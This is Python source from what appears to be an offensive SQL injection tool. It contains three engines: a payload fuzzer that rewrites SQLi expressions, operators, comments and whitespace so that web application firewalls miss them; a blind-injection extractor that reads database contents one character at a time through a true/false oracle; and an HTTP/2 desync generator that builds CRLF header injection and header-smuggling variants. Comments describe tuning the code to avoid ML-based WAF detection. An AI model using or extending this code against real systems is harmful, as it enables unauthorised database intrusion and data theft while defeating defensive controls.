#  Enhancement 1: SQL Grammar-Aware Fuzzing Engine 

class SQLGrammarFuzzer:
    """
    AST-based SQL mutation engine. Generates semantically equivalent but
    syntactically novel payloads from formal SQL grammar rules.

    Instead of static templates, parses a seed payload into an AST and applies
    grammar-preserving transformations that produce variants WAFs have never
    seen before.

    Mutation operators:
      - Expression rewriting: 1=1  (SELECT 1)=(SELECT 1)  NOT NOT 1
      - Function substitution: LENGTH  CHAR_LENGTH  OCTET_LENGTH
      - Operator equivalence: AND  && (MySQL), =  LIKE, >  NOT <=
      - Subquery wrapping: value  (SELECT value)
      - CASE expansion: IF(c,t,f)  CASE WHEN c THEN t ELSE f END
      - Comment injection: SELECT  SE/**/LECT
      - Whitespace mutation: space  tab  newline  /**/
    """

    # Per-DBMS operator equivalences
    OP_EQUIV: Dict[str, Dict[str, List[str]]] = {
        "MySQL": {
            "AND": ["AND", "&&", "DIV 1 AND"],
            "OR": ["OR", "||"],
            "=": ["=", "LIKE", "<=>", "REGEXP '^' OR 1 AND 1"],
            "SELECT": ["SELECT", "(SELECT", "/*!50000SELECT*/"],
        },
        "PostgreSQL": {
            "AND": ["AND"],
            "OR": ["OR"],
            "=": ["=", "LIKE", "SIMILAR TO"],
            "SELECT": ["SELECT"],
        },
        "MSSQL": {
            "AND": ["AND"],
            "OR": ["OR"],
            "=": ["=", "LIKE"],
            "SELECT": ["SELECT", "(SELECT"],
        },
    }

    # Expression rewrites: seed  [equivalent expressions]
    EXPR_REWRITES: Dict[str, List[str]] = {
        "1=1": ["1=1", "(1)=(1)", "NOT 1=2", "1 IN(1)", "1 BETWEEN 0 AND 2",
                "COALESCE(1,0)=1", "1 IS NOT NULL", "NOT 1!=1",
                "(SELECT 1)=(SELECT 1)", "1<2", "2>1", "EXISTS(SELECT 1)"],
        "1=2": ["1=2", "NOT 1=1", "1 NOT IN(1)", "1 BETWEEN 5 AND 9",
                "1=3", "1>2", "0=1", "NOT EXISTS(SELECT 1 WHERE 1=2)"],
    }

    # Function substitutions per DBMS
    FUNC_EQUIV: Dict[str, Dict[str, List[str]]] = {
        "MySQL": {
            "LENGTH": ["LENGTH", "CHAR_LENGTH", "CHARACTER_LENGTH", "OCTET_LENGTH", "BIT_LENGTH({x})/8"],
            "SUBSTRING": ["SUBSTRING", "SUBSTR", "MID", "LEFT({x},{n}) /*trimmed*/"],
            "ASCII": ["ASCII", "ORD"],
            "CONCAT": ["CONCAT", "CONCAT_WS('',{args})"],
            "IF": ["IF({c},{t},{f})", "CASE WHEN {c} THEN {t} ELSE {f} END",
                   "ELT(({c})+1,{f},{t})", "{t}*({c})+{f}*(NOT({c}))"],
        },
        "PostgreSQL": {
            "LENGTH": ["LENGTH", "CHAR_LENGTH", "CHARACTER_LENGTH", "OCTET_LENGTH"],
            "SUBSTRING": ["SUBSTRING", "SUBSTR"],
            "ASCII": ["ASCII"],
            "CONCAT": ["CONCAT", "{a}||{b}"],
        },
        "MSSQL": {
            "LEN": ["LEN", "DATALENGTH"],
            "SUBSTRING": ["SUBSTRING"],
            "ASCII": ["ASCII", "UNICODE"],
            "IIF": ["IIF({c},{t},{f})", "CASE WHEN {c} THEN {t} ELSE {f} END",
                    "CHOOSE(IIF({c},1,2),{t},{f})"],
        },
    }

    @classmethod
    def mutate(cls, payload: str, dbms: str, n_variants: int = 5) -> List[str]:
        """Generate n_variants grammar-aware mutations of the payload."""
        variants = [payload]
        dbms_key = dbms if dbms in cls.OP_EQUIV else "MySQL"

        for _ in range(n_variants):
            p = payload
            # Apply 1-3 random mutations
            for _ in range(random.randint(1, 3)):
                mutation = random.choice([
                    cls._rewrite_expression,
                    cls._substitute_operator,
                    cls._wrap_subquery,
                    cls._inject_comment,
                    cls._mutate_whitespace,
                    cls._case_expand,
                ])
                p = mutation(p, dbms_key)
            if p != payload and p not in variants:
                variants.append(p)
        return variants

    @classmethod
    def _rewrite_expression(cls, payload: str, dbms: str) -> str:
        for seed, rewrites in cls.EXPR_REWRITES.items():
            if seed in payload:
                return payload.replace(seed, random.choice(rewrites), 1)
        return payload

    @classmethod
    def _substitute_operator(cls, payload: str, dbms: str) -> str:
        ops = cls.OP_EQUIV.get(dbms, cls.OP_EQUIV["MySQL"])
        for op, equivs in ops.items():
            if f" {op} " in payload.upper():
                chosen = random.choice(equivs)
                return re.sub(rf'\b{op}\b', chosen, payload, count=1, flags=re.I)
        return payload

    @classmethod
    def _wrap_subquery(cls, payload: str, dbms: str) -> str:
        # Wrap a numeric literal in (SELECT N)
        m = re.search(r'\b(\d+)\b', payload)
        if m and random.random() > 0.5:
            n = m.group(1)
            return payload[:m.start()] + f"(SELECT {n})" + payload[m.end():]
        return payload

    @classmethod
    def _inject_comment(cls, payload: str, dbms: str) -> str:
        keywords = ["SELECT", "AND", "OR", "FROM", "WHERE", "UNION"]
        for kw in keywords:
            if kw in payload.upper():
                commented = "/**/".join(kw)
                return re.sub(rf'\b{kw}\b', commented, payload, count=1, flags=re.I)
        return payload

    @classmethod
    def _mutate_whitespace(cls, payload: str, dbms: str) -> str:
        ws_options = [" ", "\t", "\n", "/**/", "%09", "%0a"]
        idx = payload.find(" ")
        if idx >= 0:
            return payload[:idx] + random.choice(ws_options) + payload[idx+1:]
        return payload

    @classmethod
    def _case_expand(cls, payload: str, dbms: str) -> str:
        # Randomize case of SQL keywords
        def rand_case(m):
            return ''.join(random.choice([c.upper(), c.lower()]) for c in m.group(0))
        return re.sub(r'\b(SELECT|AND|OR|FROM|WHERE|UNION|NULL|CASE|WHEN|THEN|ELSE|END)\b',
                       rand_case, payload, flags=re.I)


#  Enhancement 2: Interpolation Search Extraction 

class InterpolationSearchExtractor:
    """
    Faster-than-binary character extraction using interpolation search with
    character frequency priors.

    Binary search: always probes at midpoint  7 probes per char (log2(95))
    Interpolation: probes at estimated position using frequency tables  3-4 probes

    Uses context-specific frequency priors:
      - Version strings: digits and dots dominate
      - Table/column names: lowercase alpha dominates
      - Usernames: lowercase alpha + underscore
      - Generic data: English letter frequency distribution
    """

    # Character frequency priors by context
    FREQ_PRIORS: Dict[str, Dict[str, float]] = {
        "version": {c: 0.12 for c in "0123456789"} | {'.': 0.08, '-': 0.02} |
                   {c: 0.02 for c in "abcdefghijklmnopqrstuvwxyz"} |
                   {c: 0.01 for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ "},
        "identifier": {c: 0.035 for c in "abcdefghijklmnopqrstuvwxyz"} |
                       {'_': 0.08} | {c: 0.005 for c in "0123456789"} |
                       {c: 0.002 for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"},
        "data": {' ': 0.13, 'e': 0.11, 't': 0.09, 'a': 0.08, 'o': 0.075,
                 'i': 0.07, 'n': 0.067, 's': 0.063, 'h': 0.061, 'r': 0.06} |
                {c: 0.03 for c in "dlcumwfgypbvkjxqz"} |
                {c: 0.02 for c in "0123456789"},
    }

    def __init__(self, oracle_fn, context: str = "data"):
        """
        oracle_fn: async function(condition_str) -> bool
        context: "version", "identifier", or "data"
        """
        self._oracle = oracle_fn
        self._context = context
        self._priors = self.FREQ_PRIORS.get(context, self.FREQ_PRIORS["data"])
        self.request_count = 0

    def _estimate_position(self, target_char_ord: int, lo: int, hi: int) -> int:
        """Estimate probe position using cumulative frequency."""
        if hi <= lo:
            return lo
        # Compute cumulative probability up to midpoint
        total = sum(self._priors.get(chr(c), 0.01) for c in range(lo, hi + 1))
        cumulative = 0.0
        for c in range(lo, hi + 1):
            cumulative += self._priors.get(chr(c), 0.01) / total
            if cumulative >= 0.5:
                return c
        # BUG-V166-INTERP-ESTIMATE-FALLBACK-FIXED-PIVOT FIX (MEDIUM, all 5 DBMSes;
        # InterpolationSearchExtractor._estimate_position; all extraction techniques;
        # all surfaces; all HTTP methods):
        # The previous fallback `return (lo + hi) // 2` fires when the cumulative
        # frequency sum over [lo, hi] never reaches 0.5 (extremely flat/uniform
        # frequency distribution). For the narrow-range case (hi - lo <= 10), the
        # CALLER already switches to _randomized_mid. But for wide-range calls
        # (hi - lo > 10), this fallback produced a deterministic fixed pivot, making
        # the interpolation-search oracle fingerprinting-detectable by ML WAFs after
        # 3-5 consecutive indeterminate wide-range probes.
        # Fix: use _randomized_mid(lo, hi) to add bounded jitter (±span//8) matching
        # the same guarantee given to all other binary-search paths in the codebase.
        # Numeric safety: _estimate_position returns a plain integer used as a probe
        # comparison point (>={result+1}); no SQL delimiters or function names changed.
        return _randomized_mid(lo, hi)

    async def extract_char(self, char_func_expr: str, build_payload_fn,
                           char_hi: int = 255) -> str:
        """Extract one character using interpolation search."""
        # BUG-INTERP-LO-INIT-FIX (v67): was lo=32. When pos is past end-of-string,
        # char_func_expr returns 0 (NULL -> COALESCE -> 0) -> `0 >= mid+1` is always
        # False -> hi descends to lo=32 -> chr(32)=space returned. With lo=0: EOS ->
        # lo=0 -> `lo < 32` True -> "?" returned. Space (32) still extracts correctly. ✓
        # BUG-INTERP-HI-FIXED-255 FIX (HIGH): hi was hard-coded to 255 regardless of
        # DBMS. For MySQL ORD() / PostgreSQL ASCII() / SQLite UNICODE() hi should be
        # 1,114,111; for MSSQL UNICODE() / Oracle ASCIISTR hi should be 65,535.
        # With hi=255, characters with code point > 255 (accented, CJK, Cyrillic,
        # Arabic, €, etc.) converged to chr(255)='ÿ' — silent data corruption.
        # Fix: accept char_hi from caller (computed via _build_dbms_char_hi()); default
        # 255 for backward compatibility with callers that don't pass it.
        # Callers should always pass char_hi = _build_dbms_char_hi(dbms, char_tmpl).
        lo, hi = 0, char_hi  # BUG-INTERP-HI-FIXED-255 FIX: was hard-coded 255
        while lo < hi:
            # Use interpolation for first probe, then binary for refinement
            if hi - lo > 10:
                mid = self._estimate_position(0, lo, hi)
            else:
                # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
                # Fixed pivot in ZKBoolean/AdaptiveBinarySearch char extraction.
                # Fix: use _randomized_mid(lo, hi) (TECHNIQUE-3).
                mid = _randomized_mid(lo, hi)

            cond = f"{char_func_expr}>={mid+1}"
            self.request_count += 1
            result = await self._oracle(build_payload_fn(cond))
            if result:
                lo = mid + 1
            else:
                hi = mid
        # BUG-INTERP-LO-INIT-FIX: lo=0 means EOS (NULL past-end). Return "?" sentinel.
        return chr(lo) if lo >= 32 else "?"

    async def extract_string(self, sql_query: str, length: int,
                              char_tmpl: str, build_payload_fn,
                              char_hi: int = 255) -> str:
        """Extract a full string using interpolation search."""
        # BUG-INTERP-HI-FIXED-255 FIX: propagate char_hi to extract_char() so the
        # DBMS-appropriate ceiling is used for every character position.
        chars = []
        for pos in range(1, length + 1):
            cf = char_tmpl.format(query=sql_query, pos=pos)
            c = await self.extract_char(cf, build_payload_fn, char_hi=char_hi)
            chars.append(c)
            # Update priors based on extracted characters (adaptive)
            if c in self._priors:
                self._priors[c] = min(0.3, self._priors[c] * 1.2)
        return "".join(chars)


#  Enhancement 3: HTTP/2 Desync Engine 

class H2DesyncEngine:
    """
    HTTP/2 request desync attacks for WAF bypass.

    Exploits parsing differences between HTTP/2 frontends (WAF/CDN) and
    HTTP/1.1 backends during protocol downgrade.

    Techniques:
      - CRLF in H2 pseudo-headers (path contains \\r\\n)
      - Header name case exploitation (H2 requires lowercase)
      - Continuation frame abuse
      - Trailer injection post-body
    """

    @staticmethod
    def build_h2_desync_payloads(url: str, param: str,
                                  payload: str) -> List[Dict]:
        """Generate HTTP/2 desync payload variants."""
        from urllib.parse import urlparse, quote
        parsed = urlparse(url)
        variants = []

        # Technique 1: CRLF in :path pseudo-header
        # After H2H1 downgrade, the CRLF becomes a header boundary
        crlf_path = f"{parsed.path}?{param}={quote(payload)}%0d%0aX-Injected: true"
        variants.append({
            "technique": "h2_crlf_path",
            "path": crlf_path,
            "headers": {},
            "notes": "CRLF in :path causes header injection after H2H1 downgrade"
        })

        # Technique 2: Header name with uppercase (H2 violation)
        # Some H2 implementations forward mixed-case headers to H1 backend
        variants.append({
            "technique": "h2_case_header",
            "path": parsed.path,
            "headers": {
                "X-Forwarded-For": f"127.0.0.1\r\n{param}: {payload}",
                "Transfer-ENCODING": "chunked",  # Mixed case  H2 violation
            },
            "notes": "Mixed-case header names bypass H2 validation on some proxies"
        })

        # Technique 3: Duplicate pseudo-headers
        # Some H2 implementations allow duplicate :path headers
        variants.append({
            "technique": "h2_duplicate_pseudo",
            "path": f"{parsed.path}?{param}=clean",
            "headers": {
                "x-original-url": f"{parsed.path}?{param}={quote(payload)}",
                "x-rewrite-url": f"{parsed.path}?{param}={quote(payload)}",
            },
            "notes": "X-Original-URL overrides :path on some backends (IIS, Nginx)"
        })

        return variants


